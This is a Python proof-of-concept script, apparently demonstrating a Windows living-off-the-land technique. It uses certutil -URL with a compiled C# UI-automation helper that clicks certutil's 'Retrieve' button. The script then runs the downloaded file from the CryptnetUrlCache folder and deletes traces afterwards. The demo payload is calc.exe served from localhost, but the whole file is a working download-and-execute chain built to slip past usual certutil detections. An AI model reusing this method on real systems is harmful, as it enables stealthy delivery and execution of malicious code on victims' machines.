import os
import sys
import shutil
import time
import threading
import subprocess
import getpass
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from datetime import datetime

HOST = "127.0.0.1"
PORT = 8000
WORK_DIR = r"C:\Temp\CertutilExploit"
PAYLOAD_SOURCE = r"C:\Windows\System32\calc.exe"
CERTUTIL_PATH = r"C:\Windows\System32\certutil.exe"
CSC_PATH = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

class SilentHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'): pass
    def log_message(self, format, *args): pass

def setup_environment():
    try:
        os.makedirs(WORK_DIR, exist_ok=True)
        shutil.copy(PAYLOAD_SOURCE, os.path.join(WORK_DIR, "calc.exe"))
        return True
    except Exception as e:
        return False

def start_http_server():
    os.chdir(WORK_DIR)
    with TCPServer((HOST, PORT), SilentHTTPRequestHandler) as httpd:
        httpd.serve_forever()

def build_csharp_automator():
    csharp_code = """
using System;
using System.Diagnostics;
using System.Windows.Automation;
public class CertUtilAutomation
{
    public static void ClickRetrieveButtonAndKillCertUtil()
    {
        const string targetProcessName = "CertUtil";
        const string targetButtonName = "Retrieve";
        Process certUtilProcess = null;
        try
        {
            certUtilProcess = FindProcessByName(targetProcessName);
            if (certUtilProcess == null)
            {
                return;
            }
            AutomationElement rootElement = AutomationElement.FromHandle(certUtilProcess.MainWindowHandle);
            if (rootElement == null)
            {
                return;
            }
            AutomationElement retrieveButton = FindButtonByText(rootElement, targetButtonName);
            if (retrieveButton == null)
            {
                return;
            }
            InvokeButton(retrieveButton);
            System.Threading.Thread.Sleep(2000);
            certUtilProcess.Kill();
        }
        catch (Exception ex)
        {
        }
        finally
        {
            if (certUtilProcess != null) 
                certUtilProcess.Dispose();
        }
    }
    private static Process FindProcessByName(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        return processes.Length > 0 ? processes[0] : null;
    }
    private static AutomationElement FindButtonByText(AutomationElement rootElement, string buttonText)
    {
        Condition condition = new AndCondition(
            new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Button),
            new PropertyCondition(AutomationElement.NameProperty, buttonText)
        );
        return rootElement.FindFirst(TreeScope.Descendants, condition);
    }
    private static void InvokeButton(AutomationElement buttonElement)
    {
        InvokePattern invokePattern = buttonElement.GetCurrentPattern(InvokePattern.Pattern) as InvokePattern;
        if (invokePattern != null) 
            invokePattern.Invoke();
    }
    public static void Main(string[] args)
    {
        ClickRetrieveButtonAndKillCertUtil();
    }
}
"""
    try:
        with open(os.path.join(WORK_DIR, "CertUtilAutomation.cs"), "w") as f:
            f.write(csharp_code)
        
        windows_sdk_path = os.path.join(os.environ["ProgramFiles(x86)"], "Reference Assemblies", "Microsoft", "Framework", ".NETFramework", "v4.8.1")
        
        build_cmd = [
            CSC_PATH,
            "/t:exe",
            f"/out:{os.path.join(WORK_DIR, 'CertUtilAutomation.exe')}",
            "/reference:System.dll",
            "/reference:System.Core.dll",
            "/reference:System.Data.dll",
            "/reference:System.Xml.dll",
            "/reference:System.Xml.Linq.dll",
            f"/reference:{os.path.join(windows_sdk_path, 'UIAutomationClient.dll')}",
            f"/reference:{os.path.join(windows_sdk_path, 'UIAutomationTypes.dll')}",
            os.path.join(WORK_DIR, "CertUtilAutomation.cs")
        ]
        
        subprocess.run(
            build_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return os.path.exists(os.path.join(WORK_DIR, "CertUtilAutomation.exe"))
    except Exception as e:
        return False

def execute_via_certutil():
    try:
        server_thread = threading.Thread(target=start_http_server, daemon=True)
        server_thread.start()
        time.sleep(3)

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE 

        certutil_cmd = f'"{CERTUTIL_PATH}" -URL http://{HOST}:{PORT}/calc.exe'
        automator_path = os.path.join(WORK_DIR, "CertUtilAutomation.exe")
        
        certutil_process = subprocess.Popen(
            certutil_cmd,
            shell=True,
            startupinfo=startupinfo,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        time.sleep(3) 
        
        subprocess.run(automator_path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        username = getpass.getuser()
        content_dir = f"C:\\Users\\{username}\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content"
        
        if not os.path.exists(content_dir):
            return False
        
        # Find newest file
        files = [os.path.join(content_dir, f) for f in os.listdir(content_dir) 
                if os.path.isfile(os.path.join(content_dir, f))]
        if not files:
            return False
            
        newest_file = max(files, key=os.path.getctime)
        renamed_path = os.path.join(content_dir, "calc.exe")
        
        time.sleep(3)

        try:
            os.rename(newest_file, renamed_path)
            subprocess.Popen(renamed_path, shell=True)
            return True
        except Exception as e:
            return False
            
    except Exception as e:
        return False

def cleanup():
    try:
        
        for f in ["CertUtilAutomation.cs", "CertUtilAutomation.exe", "calc.exe"]:
            try:
                os.remove(os.path.join(WORK_DIR, f))
            except:
                pass
        
        username = getpass.getuser()
        content_dir = f"C:\\Users\\{username}\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content"
        payload_path = os.path.join(content_dir, "calc.exe")
        
        if os.path.exists(payload_path):
            try:
                os.remove(payload_path)
            except Exception as e:
                pass
                
    except Exception as e:
        pass

def main():
    if not setup_environment():
        sys.exit(1)
    
    if not build_csharp_automator():
        cleanup()
        sys.exit(1)

    execute_via_certutil()
    time.sleep(3)
    cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cleanup()
        sys.exit(0)
